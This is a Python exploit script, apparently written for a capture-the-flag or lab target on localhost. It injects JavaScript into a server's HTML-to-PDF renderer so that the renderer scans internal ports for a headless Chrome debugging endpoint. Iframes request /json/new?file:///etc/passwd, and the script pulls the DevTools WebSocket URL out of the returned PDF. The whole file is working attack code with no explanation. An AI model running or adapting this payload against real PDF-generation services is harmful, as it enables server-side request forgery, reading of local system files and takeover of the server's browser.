from threading import Thread
import time
import os
import PyPDF2
import re
import io
from datetime import datetime
import requests

TARGET_URL = "http://localhost:8080"

def download_pdf(payload):
    r = requests.post(f"{TARGET_URL}/render.php", data={
        "content": payload
    })

    if r.status_code != 200:
        return None

    return r.content


def parse_pdf(pdf_content):
    text = ""
    reader = PyPDF2.PdfReader(io.BytesIO(pdf_content))
    get_text = False
    for page in reader.pages:
        page_content = page.extract_text()
        pattern = r"localhost:[0-9]+\/devtools\/page\/[a-zA-Z0-9\n]+"
        # Matching
        matches = re.finditer(pattern, page_content, re.MULTILINE)
        for match in matches:
            ws_url = match.group()
            return ws_url.replace("\n","")
    return None


def new_scan_payload(port):
    payload = f"""
<html>
    <body>
        <script>
            for(let port = {port}; port < {port+1000}; port++)
""" + """{
                let iframe = document.createElement('iframe');
                iframe.src = `http://localhost:${port}/json/new?file:///etc/passwd`;
                iframe.width = 1000;
                iframe.height = 200;
                document.body.appendChild(iframe);
            }
        </script>
    </body>
</html>
"""

    return payload


def scan(start_port):
    print(f"Scanning from port {start_port}... ")
    data = download_pdf(new_scan_payload(start_port))

    if data is None:
        print("Error downloading pdf in Scan Thread")
        return

    print("Downloaded scan payload")

    result = parse_pdf(data)

    if result:
        print(f"The port is at: {result}")
        exit(0)
    else:
        print("No luck")


if __name__ == '__main__':
    print("Gonna scan'em all")
    for i in range(1024, 65536, 1000):
        scan(i)
        time.sleep(1)
